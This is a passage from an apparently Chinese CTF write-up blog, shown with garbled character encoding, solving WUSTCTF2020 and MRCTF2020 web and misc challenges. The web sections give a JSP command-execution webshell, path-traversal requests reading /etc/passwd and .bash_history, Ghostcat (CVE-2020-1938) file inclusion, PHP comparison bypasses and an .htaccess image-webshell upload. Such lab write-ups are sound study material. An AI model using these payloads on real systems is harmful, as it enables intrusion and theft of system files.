<p>å¯¹åç¼€æ²¡æœ‰é™åˆ¶ä¸Šä¼ phpå°±å¥½,èšå‰‘è¿ä¸Šåœ¨æ ¹ç›®å½•å°±ä¼šå‘ç°flagï¼ˆåŸé¢˜å¥½åƒæ˜¯æƒé™ä¸å¤Ÿï¼Œéœ€è¦è¿è¡Œreadflag</p>
<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>è€ƒç‚¹ï¼šJSPã€CVE-2020-1938å¹½çµçŒ«æ–‡ä»¶åŒ…å«</p>
<p>å‚è€ƒçš„åšå®¢ï¼š<a href="https://imagin.vip/?p=1126#easyweb" target="_blank" rel="noopener">IMAGINâ€™S BLOG</a>ã€<a href="https://www.gem-love.com/ctf/2176.html#easyweb" target="_blank" rel="noopener">é¢–å¥‡Lâ€™Amore</a>ã€<a href="http://github.mrkaixin.computer/2020/04/03/WUST-CTF2020/" target="_blank" rel="noopener">Mr.Kaixin</a>ã€<a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves" target="_blank" rel="noopener">52HeRtzâ€™s Blog</a></p>
<p>è¿™é¢˜å¡äº†å¥½ä¹…ï¼Œè¿˜æ˜¯ç¬¬ä¸€æ¬¡åšè¿™ç§æ ¹æ®CVEæ”¹çš„CTFé¢˜ç›®ï¼Œæœ€åˆçœ‹å®˜æ–¹wpçº ç»“äºpocsuiteçš„ä½¿ç”¨ï¼Œé…ç½®äº†å¥½ä¹…ï¼Œç”¨ä¸æ¥ã€‚ã€‚ç„¶åå°±å»çœ‹äº†ä¸‹åˆ«çš„å¤§ä½¬çš„åšå®¢ï¼Œè‡ªå·±åˆæ‘¸ç´¢äº†åŠå¤©æ‰æå‡ºæ¥ã€‚ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸¤ç§è§£æ³•ã€‚</p>
<p>é¢„æœŸè§£å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªjspå‘½ä»¤æ‰§è¡ŒğŸï¼Œç„¶åç”¨å¹½çµğŸ±æ¼æ´å»åŒ…å«è¿™ä¸ªğŸï¼Œæ‰§è¡Œåé€šè¿‡å›æ˜¾å¾—çŸ¥flagçš„ä½ç½®ã€‚</p>
<p>éé¢„æœŸå°±æ˜¯é€šè¿‡ä»»æ„æ–‡ä»¶ä¸‹è½½æ¥è¯»/home/tomajp/.bashrc_historyï¼Œä»è€Œå¾—åˆ°æ‰§è¡Œç”Ÿæˆflagæ—¶çš„å­˜æ”¾ä½ç½®ï¼Œè¿›è€Œå»è¯»flagæ‰€åœ¨æ–‡ä»¶å¾—åˆ°flagï¼Œä½†æ˜¯åœ¨buuä¸Šç”±äºæ˜¯dockerç”Ÿæˆçš„æ‰€ä»¥ä¸éœ€è¦å»é€šè¿‡tomajpç”¨æˆ·å»ç”Ÿäº§flagæ‰€ä»¥å°±æ— éé¢„æœŸäº†ã€‚(å…¶å®è¿˜æœ‰ï¼Œå¦‚æœä½ èƒ½çŒœåˆ°æ ¹ç›®å½•ä¸‹å­˜æ”¾flagçš„æ–‡ä»¶çš„åå­—ï¼Œä¸è¿‡åŸºæœ¬ä¸å¯èƒ½ã€‚ã€‚å› ä¸ºå®ƒå«<code>flag78bt787it8b9b098j0k80k0ggg</code></p>
<p>éé¢„æœŸè§£è¿˜æŒºç®€å•çš„:</p>
<p>1.ä»»æ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åç”¨é”™è¯¯çš„æ–‡ä»¶åå»è¯»ä¸€ä¸‹ï¼Œæ–‡ä»¶è·¯å¾„å°±ä¼šæš´éœ²å‡ºæ¥</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>2.<code>download?file=../../../../../../../etc/passwd</code>è¯»åˆ°å­˜åœ¨tomajpç”¨æˆ·ï¼Œç„¶åä¸‹è½½å®ƒçš„bash_historyæ–‡ä»¶ <code>download?file=../../../../../../../home/tomajp/.bash_history</code>å‘ç°æ‰§è¡Œè¿‡çš„å‘½ä»¤ï¼Œå‘ç°flagå­˜æ”¾çš„æ–‡ä»¶å¤¹ï¼Œç„¶åè¯»å–flagå­˜æ”¾æ–‡ä»¶å¤¹<code>download?file=../../../../../../../flaaaag/what_you_want</code>å¾—åˆ°flag</p>
<p>é¢„æœŸè§£ï¼š</p>
<p>1.ä¸Šä¼ ä¸€ä¸ªjspğŸ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">jsp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(<span class="string">"æ‰§è¡Œçš„å‘½ä»¤"</span>).getInputStream();</span><br><span class="line"><span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">	out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æ‰§è¡Œçš„å‘½ä»¤:</span></span><br><span class="line"><span class="comment">ls -al \ è¢«è¿™ä¸ª\å‘å‚»äº†è‡ªåŠ¨æŠŠåé¢çš„"è½¬è¯‘äº†æŠ¥é”™å­—ç¬¦ä¸²é—­åˆé—®é¢˜ï¼Œä¸æ‡‚javaçš„æˆ‘è¿˜ä»¥ä¸ºæ˜¯å­—ç¬¦ä¸²é‡Œçš„ç©ºæ ¼é—®é¢˜ï¼Œåæ¥å¶ç„¶çœ‹åˆ°è½¬è¯‘\\rçš„æ—¶å€™æ‰ååº”è¿‡æ¥æ‰€ä»¥æˆ‘æŠŠå‘½ä»¤æ¢æˆäº†ls -al /</span></span><br><span class="line"><span class="comment">cat /flag78bt787it8b9b098j0k80k0ggg</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<p>2.é€šè¿‡AJPåŒ…å«è¿™ä¸ªjspæ–‡ä»¶ï¼Œä»è€Œæ‰§è¡Œå…¶ä¸­çš„ä»£ç ï¼ˆ<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487" target="_blank" rel="noopener">è„šæœ¬åœ°å€</a></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>å‘ç°æ ¹ç›®å½•ä¸‹flagå­˜æ”¾ä½ç½®ï¼Œè¯»å–å¾—åˆ°flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>è¯¦ç»†æ­¥éª¤ï¼šå…ˆæŠŠè¿™ä¸ªajpShooter.pyä¸Šä¼ åˆ°buuçš„linux-labçš„æœºå­ä¸Šï¼Œç„¶åç”¨è¿™ä¸ªè„šæœ¬åŒ…å«ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæœ€åé€šè¿‡å„æ ·å¼çš„å‘½ä»¤æ‰§è¡Œå¾—åˆ°flagã€‚åå¼¹shellé‚£ä¸ªjspè„šæœ¬æˆ‘ç”¨ä¸æ¥ã€‚ã€‚ï¼ˆæ³¨æ„ï¼š<code>Lan Domain: 2554-169ec896-03d5-483f-97ca-369fbcc3bdbf</code>ç”¨çš„æ˜¯å±€åŸŸç½‘ï¼Œç”¨readå¯ä»¥å»è¯»å–æ–‡ä»¶çš„å†…å®¹ï¼Œevalæ˜¯è¾“å‡ºæ–‡ä»¶æ‰§è¡Œçš„ç»“æœã€‚</p>
<p>æœ€åæœ‰æ—¶é—´å»å¤ç°ä¸€ä¸‹è¿™ä¸ªæ¼æ´<a href="https://www.liuyixiang.com/post/109123.html" target="_blank" rel="noopener">CVE-2020-1938</a></p>
<h3 id="Train-Yourself-To-Be-Godly"><a href="#Train-Yourself-To-Be-Godly" class="headerlink" title="Train Yourself To Be Godly"></a>Train Yourself To Be Godly</h3><p>è¿™ä¸ªç­‰å­¦å­¦ç›®å½•è·¨è¶Šå’Œjspç›¸å…³çŸ¥è¯†å†æ¥å¤ç°å§ã€‚</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>è€ƒç‚¹ï¼šç”µè¯éŸ³ã€ä¹é”®é”®ç›˜</p>
<p>è¿™æ¬¡æœ‰ç‚¹å¤šå°±ä¸å¯¹ç€è¡¨æ‰‹è§£äº†ï¼Œç”¨ä¸ªè‡ªåŠ¨åŒ–å·¥å…·<a href="https://github.com/hfeeki/dtmf" target="_blank" rel="noopener">dtmf-decoder</a>æä¸€ä¸‹å¾—åˆ°</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999*666*88*2*777*33*6*999*4*444*777*555*333*777*444*33*66*3*7777</span><br></pre></td></tr></table></figure></div>

<p>å¯¹ç€ä¹é”®é”®ç›˜ç¿»è¯‘ä¸€ä¸‹å¾—åˆ°flagï¼š<code>flag{youaremygirlfriends}</code></p>
<h3 id="find-me"><a href="#find-me" class="headerlink" title="find_me"></a>find_me</h3><p>çœ‹å¤‡æ³¨+<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">ç›²æ–‡è½¬æ¢</a></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="çˆ¬"><a href="#çˆ¬" class="headerlink" title="çˆ¬"></a>çˆ¬</h3><p>åˆ¤æ–­æ–‡ä»¶ç±»å‹ä¸ºpdfï¼Œç”¨wpsç­‰å·¥å…·æ‰“å¼€ï¼Œå›¾ç‰‡åé¢æœ‰å¦ä¸€ä¸ªå›¾ç‰‡ï¼Œå¾—åˆ°å­—ç¬¦ä¸²</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d</span><br></pre></td></tr></table></figure></div>

<p><a href="https://www.qqxiuzi.cn/bianma/base.php?type=16" target="_blank" rel="noopener">base16è§£ç </a>ï¼Œå¾—åˆ°flagï¼š<code>wctf2020{th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p}</code></p>
<h3 id="spaceclub"><a href="#spaceclub" class="headerlink" title="spaceclub"></a>spaceclub</h3><p>é•¿ç©ºæ ¼ä¸º1ï¼Œç©ºæ ¼ä¸º0å¾—åˆ°</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">011101110110001101110100011001100011001000110000001100100011000001111011011010000011001101110010011001010101111100110001011100110101111101111001001100000111010101110010010111110110011001101100010000000110011101011111011100110011000101111000010111110111001100110001011110000101111101110011001100010111100001111101</span><br></pre></td></tr></table></figure></div>

<p>2è¿›åˆ¶è½¬ASCIIï¼Œå¾—åˆ°flagï¼š<code>wctf2020{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}</code></p>
<h3 id="alison-likes-jojo"><a href="#alison-likes-jojo" class="headerlink" title="alison_likes_jojo"></a>alison_likes_jojo</h3><p>æ–‡ä»¶åˆ†ç¦»ã€zipçˆ†ç ´ã€å¤šæ¬¡base64ã€outguess</p>
<p>boki.jpgåˆ†ç¦»å‡ºä¸€ä¸ªzipï¼Œçˆ†ç ´å‡ºæ¥å¯†ç æ˜¯<code>888866</code>ï¼Œå¾—åˆ°ä¸€ä¸ªæ–‡æœ¬å¤šæ¬¡base64è§£å¯†åå¾—åˆ°keyï¼š<code>killerqueen</code></p>
<p>stegdetectæµ‹ä¸å‡ºæ¥ã€‚ã€‚çœ‹wpï¼Œæ²¡è¯´å•¥è½¯ä»¶æµ‹å‡ºæ¥çš„ã€‚ã€‚å°±å—¯çŒœï¼Ÿï¼Ÿ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">outguess -r jljy.jpg -k <span class="string">"killerqueen"</span> 1.txt</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°flagï¼š<code>wctf2020{pretty_girl_alison_likes_jojo}</code></p>
<h3 id="ä½›è¯´ï¼šåªèƒ½å››å¤©"><a href="#ä½›è¯´ï¼šåªèƒ½å››å¤©" class="headerlink" title="ä½›è¯´ï¼šåªèƒ½å››å¤©"></a>ä½›è¯´ï¼šåªèƒ½å››å¤©</h3><p>è¿™ä¸ªå¯†ç å­¦é¢˜æ›´åƒmiscï¼Œå°±å†™åˆ°è¿™é‡Œå§</p>
<p>æ–°ä½›æ›°ã€ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ã€æ æ …ã€å‡¯æ’’ã€base32</p>
<p>å‰ä¸‰ä¸ªè¿˜å¥½ï¼Œå‡¯æ’’é‚£ä¸ªä½æ•°æ˜¯çœŸçš„æœ‰ã€æ¶å¿ƒï¼ˆå®˜æ–¹è§£é‡Šï¼šå‡¯æ’’å¯†ç æœ€å¹¿çš„æ˜¯ç§»ä½3ä½ï¼Œå¾ˆå¤šåœ¨çº¿è§£ç å™¨é»˜è®¤ä¹Ÿæ˜¯3ä½ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯3ä½ç§»ä½ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å°Šå³å¯‚ä¿®æˆ‘åŠ«ä¿®å¦‚å©†æ„é—åš¤å©†èŠæ„è€¨ç¾…åš´æ˜¯å–¼å©†æ–¯å¶çœ¾å–¼ä¿®è¿¦æ…§è¿¦åš©å–¼æ–¯é¡˜åš¤æ‘©éš¸æ‰€è¿¦æ‘©å½å³å¡é¡˜ä¿®å’’èŠæ³¢æ–¯è¨¶å–ƒå£½ç¥—åƒ§è‹¥å³äº¦å˜‡èœœè¿¦é ˆè‰²å–¼ç¾…å›‰å’’è«¦è‹¥é™€å–ƒæ…§æ„å¤·ç¾…æ³¢è‹¥åŠ«èœœæ–¯å“†å’’å¡éš¸èœœæ³¢å“†å’¤æ…§èäº¦å½å¿µå½Œè«¸å˜šåš´è«¦å’’é™€å»å’¤å»è«¦ç¼½éš¸ç¥—å©†è«¦åš©é˜¿å…œå®£å›‰å½è‰²ç¼½å¶è«¸åŠ«å©†å’¤å’¤å–¼æ„å°Šå¯‚è‰²ç¼½å˜šé—å…œé˜¿å©†è‹¥å»èˆ¬å£½èå½Œå³å¿µè‹¥é™å®£ç©ºé™€å£½æ„åš¤äº¦å–¼å¯‚åƒ§è¿¦è‰²èŠå£½å½å“†å°Šåƒ§å–¼å–ƒå£½å˜šå…œæˆ‘ç©ºæ‰€å¶èˆ¬æ‰€å³è«¸å½è–©å’¤è«¸èŠå›‰éš¸èˆ¬å’¤è‰²ç©ºå’¤äº¦å–ƒäº¦è‰²å…œå“†å˜‡äº¦éš¸ç©ºé—ä¿®çœ¾å“†å’’å©†è©è¿¦å£½è–©å¡å®£åš©ç¼½å¯‚å¤·æ‘©æ‰€ä¿®å›‰è©é˜¿ä¼å˜šå®£åš©è–©å¡è©æ³¢å¶æ³¢è©å“†è‹¥æ…§æ„èœœè¨¶å£½è‰²å’’å…œæ‘©ç¼½æ‘©è«¦åŠ«è«¸é™€å³å£½æ‰€æ³¢å’¤èå¦‚è¨¶æ‘©å£½å®£å’¤å½Œå³åš©èœœå»åŠ«å˜‡ç¼½æ‰€æ‘©é—å£½æ³¢å£½åŠ«ä¿®è¨¶å¦‚åš©å˜‡å›‰è–©è‰²åš¤è–©å£½ä¿®é—å¤·é—æ˜¯å£½åƒ§åŠ«ç¥—èœœåš´åš©æˆ‘è‹¥ç©ºä¼è«¦å¿µé™è‹¥å¿ƒå½å’¤éš¸å˜šè€¨ç¼½ä¼å½è‰²å¯‚å–ƒå–¼å½å£½å¤·è‹¥å¿ƒçœ¾ç¥—å–ƒæ…§åš´å³èç©ºåƒ§é ˆå¤·åš´å»å¿ƒé¡˜å“†æ³¢éš¸å¡å¶å¿ƒé ˆå˜‡æ‘©å’¤å£½å˜šå¶å¤·äº¦å¿ƒäº¦å–ƒè‹¥å’’å£½äº¦å£½å›‘å›‘</span><br><span class="line">å¹³ç­‰æ–‡æ˜è‡ªç”±å‹å–„å…¬æ­£è‡ªç”±è¯šä¿¡å¯Œå¼ºè‡ªç”±è‡ªç”±å¹³ç­‰æ°‘ä¸»å¹³ç­‰è‡ªç”±è‡ªç”±å‹å–„æ•¬ä¸šå¹³ç­‰å…¬æ­£å¹³ç­‰å¯Œå¼ºå¹³ç­‰è‡ªç”±å¹³ç­‰æ°‘ä¸»å’Œè°å…¬æ­£è‡ªç”±è¯šä¿¡å¹³ç­‰å’Œè°å…¬æ­£å…¬æ­£è‡ªç”±æ³•æ²»å¹³ç­‰æ³•æ²»æ³•æ²»æ³•æ²»å’Œè°å’Œè°å¹³ç­‰è‡ªç”±å’Œè°è‡ªç”±è‡ªç”±å’Œè°å…¬æ­£è‡ªç”±æ•¬ä¸šè‡ªç”±æ–‡æ˜å’Œè°å¹³ç­‰è‡ªç”±æ–‡æ˜å’Œè°å¹³ç­‰å’Œè°æ–‡æ˜è‡ªç”±å’Œè°è‡ªç”±å’Œè°å’Œè°å¹³ç­‰å’Œè°æ³•æ²»å…¬æ­£è¯šä¿¡å¹³ç­‰å…¬æ­£è¯šä¿¡æ°‘ä¸»è‡ªç”±å’Œè°å…¬æ­£æ°‘ä¸»å¹³ç­‰å¹³ç­‰å¹³ç­‰å¹³ç­‰è‡ªç”±å’Œè°å’Œè°å’Œè°å¹³ç­‰å’Œè°è‡ªç”±è¯šä¿¡å¹³ç­‰å’Œè°è‡ªç”±è‡ªç”±å‹å–„æ•¬ä¸šå¹³ç­‰å’Œè°è‡ªç”±å‹å–„æ•¬ä¸šå¹³ç­‰æ³•æ²»è‡ªç”±æ³•æ²»å’Œè°å’Œè°è‡ªç”±å‹å–„å…¬æ­£æ³•æ²»æ•¬ä¸šå…¬æ­£å‹å–„çˆ±å›½å…¬æ­£æ°‘ä¸»æ³•æ²»æ–‡æ˜è‡ªç”±æ°‘ä¸»å¹³ç­‰å…¬æ­£è‡ªç”±æ³•æ²»å¹³ç­‰æ–‡æ˜å¹³ç­‰å‹å–„è‡ªç”±å¹³ç­‰å’Œè°è‡ªç”±å‹å–„è‡ªç”±å¹³ç­‰æ–‡æ˜è‡ªç”±æ°‘ä¸»è‡ªç”±å¹³ç­‰å¹³ç­‰æ•¬ä¸šè‡ªç”±å¹³ç­‰å¹³ç­‰è¯šä¿¡å¯Œå¼ºå¹³ç­‰å‹å–„æ•¬ä¸šå…¬æ­£è¯šä¿¡å¹³ç­‰å…¬æ­£å‹å–„æ•¬ä¸šå…¬æ­£å¹³ç­‰å¹³ç­‰è¯šä¿¡å¹³ç­‰å…¬æ­£è‡ªç”±å…¬æ­£è¯šä¿¡å¹³ç­‰æ³•æ²»æ•¬ä¸šå…¬æ­£è¯šä¿¡å¹³ç­‰æ³•æ²»å¹³ç­‰å…¬æ­£å‹å–„å¹³ç­‰å…¬æ­£è¯šä¿¡è‡ªç”±å…¬æ­£å‹å–„æ•¬ä¸šæ³•æ²»æ³•æ²»å…¬æ­£å…¬æ­£å…¬æ­£å¹³ç­‰å…¬æ­£è¯šä¿¡è‡ªç”±å…¬æ­£å’Œè°å…¬æ­£å¹³ç­‰</span><br><span class="line">RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence</span><br><span class="line">R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar_</span><br><span class="line">o5rxizrsgazda63onfpwqylpl54gsylom5pxq2lbnztv6zdbl53w67i</span><br></pre></td></tr></table></figure></div>

<p>æœ€åå†æ¥ä¸ªbase32ï¼Œå¾—åˆ°flagï¼š<code>wctf2020{ni_hao_xiang_xiang_da_wo}</code></p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020</title>
    <url>/2020/03/30/MRCTF/</url>
    <content><![CDATA[<p>å‘¨æœ«æœ‰ä¸¤åœºæ¯”èµ›ï¼ŒWUSTå’ŒMRCTFï¼Œéƒ½å»çœ‹äº†ä¸€ä¸‹ï¼ˆè™½ç„¶æ²¡å’‹åšé¢˜ï¼‰ï¼Œå¯†ç å­¦çƒ¦äººå•Šï¼ˆçœŸæ»´éš¾ï¼‰ï¼Œè¿˜æ˜¯åœ¨buuå¤ç›˜æœ‰æ„æ€</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h3><p>ä»£ç å®¡è®¡ã€å¼±ç±»å‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure></div>

<p>ç”¨æ•°ç»„ç»•è¿‡md5ï¼Œç”¨æ•°å­—+å­—ç¬¦ç»•è¿‡is_numeric()+å¼±ç­‰äº</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/1.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">javascript</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">code</span>)</span>&#123;</span><br><span class="line">  hash = hex_md5(code);</span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> code = <span class="built_in">document</span>.getElementById(<span class="string">"vcode"</span>).value;</span><br><span class="line">  <span class="keyword">if</span> (code != <span class="string">""</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(hex_md5(code) == <span class="string">"0cd4da0223c0b280829dc3ea458d655c"</span>)&#123;</span><br><span class="line">      alert(<span class="string">"æ‚¨é€šè¿‡äº†éªŒè¯ï¼"</span>);</span><br><span class="line">      <span class="built_in">window</span>.location = <span class="string">"./flag.php"</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      alert(<span class="string">"ä½ çš„æˆæƒç ä¸æ­£ç¡®ï¼"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    alert(<span class="string">"è¯·è¾“å…¥æˆæƒç "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>åœ¨æºç é‡Œå‘ç°è¿™æ®µjsï¼Œè¿™é¢˜å¡åœ¨md5å¥½ä¹…ã€‚ã€‚æ·¦ï¼ŒåŸæ¥æ˜¯ä¸ç”¨è§£å¯†çš„ï¼Œå°±æ˜¯ä¸ªå‰ç«¯éªŒè¯ï¼Œè€Œä¸”è¿˜ç ´è§£ä¸å‡ºæ¥md5çš„å€¼</p>
<p>ç›´æ¥è®¿é—®/flag.php</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>æ„é€ X-Forwarded-For: 127.0.0.1ï¼Œå¾—åˆ°flag</p>
<h3 id="ä½ ä¼ ä½ ğŸå‘¢"><a href="#ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="ä½ ä¼ ä½ ğŸå‘¢"></a>ä½ ä¼ ä½ ğŸå‘¢</h3><p>æœåŠ¡å™¨æç¾å›½ï¼Œç»™çˆ·æ•´å‚»äº†ï¼Œæœ¬æ¥é¢˜ä¸æ˜¯å¾ˆéš¾ï¼Œè¿™å‘åŒ…æ²¡å“åº”ç»™çˆ·å¿ƒæ€æå´©äº†ï¼Œåæ¥è¿ä¸Šèšå‰‘åç»ˆäºçŸ¥é“ä¸ºå•¥ç½‘ç«™å¡äº†ã€‚ã€‚</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/30/MRCTF/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¼€é¢˜ä¸€çœ‹å°±çŸ¥é“æ˜¯è€ç¥–å®‰äººäº†</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>å…ˆä¸Šä¼ ä¸ªè§£æå›¾ç‰‡ä¸ºphpçš„.htaccessæ–‡ä»¶ï¼Œæ”¹ä¸€ä¸‹Content-Typeï¼Œå†ä¼ ä¸ªå›¾ç‰‡ğŸ</p>
